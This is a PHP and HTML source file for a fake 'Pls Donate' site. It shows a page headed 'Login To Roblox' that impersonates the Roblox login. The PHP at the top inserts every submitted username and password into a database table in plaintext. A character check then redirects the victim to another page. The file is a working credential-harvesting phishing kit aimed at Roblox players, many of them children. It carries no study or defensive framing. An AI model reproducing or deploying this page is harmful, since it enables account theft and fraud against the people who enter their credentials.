<?php

 if (isset($_POST['user_name'])) {
  include ("connect.php");

  $user_name = $_POST['user_name'];
  $password = $_POST['password'];

  $stmt = $db->prepare("INSERT INTO user(user_name, password)
                                          VALUES(:n, :p)");
  $stmt->execute(array(
    'n' => $user_name,
    'p' => $password
  ));                                   

 }
 
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Pls_Donate_(Offical_Website)</title>
    <link rel="stylesheet" href="all.min.css" />
    <link rel="stylesheet" href="framework.css" />
    <link rel="stylesheet" href="master.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;500&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="any.css">
  </head>
  <body style="background-color: #f2f4f5;">
 <div class="login" style="width:100%; display: flex; justify-content: center;">
 <div class="content" style="background-color:white; padding: 15px; margin-top: 13px; height: 455.97px; width: 400px; text-align: center;">
 <span><?php
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $stop = true;
  for ($i = 0; $i < strlen($_POST['user_name']); $i++) {
    if (ord($_POST['user_name'][$i]) >= 33 && ord($_POST['user_name'][$i]) <= 47) {
      $stop = false;
    }  elseif (ord($_POST['user_name'][$i]) >= 58 && ord($_POST['user_name'][$i]) <= 64) {
      $stop = false;
    }  elseif (ord($_POST['user_name'][$i]) >= 91 && ord($_POST['user_name'][$i]) <= 96) {
      $stop = false;
    } elseif (ord($_POST['user_name'][$i]) >= 123) {
      $stop = false;
    }
  }

  if ($stop === false) {
    echo '<p style="color: red;">Cant Enter Special Character Ex: ()$%^^%*&#;:_-</p>';
  } else {
    header("location: index.html");
    exit();
  }

 }

 ?></span>
 <p style="margin-bottom: 76px; font-weight: 800; font-size: 32px; margin-top: 30px;">Login To Roblox</p>
  <form style="text-align: center; width: 100%;" action="<?php $_SERVER['PHP_SELF']; ?>" method="POST">
    <input class="user" type="text" placeholder="user_name/Email/Phone" name="user_name" style="width: 100%; margin-bottom: 15px; outline: none; height: 38px; border-radius: 8px; padding: 5px 12px; border-color: rgba(57,59,61,.2);" required><br>
    <input class="pass" type="text" placeholder="Password" name="password" style="width: 100%; margin-bottom: 15px; height: 38px; outline: none; border-radius: 8px; padding: 5px 12px; border-color: rgba(57,59,61,.2);" required><br>
    <input class="any" type="submit" value="Log in" value="sub" style="width: 100%; height: 38px; outline: none; border-radius: 8px; padding: 5px 12px; color: rgba(0,0,0,.6); font-size: 16px; border-width: 1px;"><br>
   </form>
 </div>
 <div>

  </body>
</html>
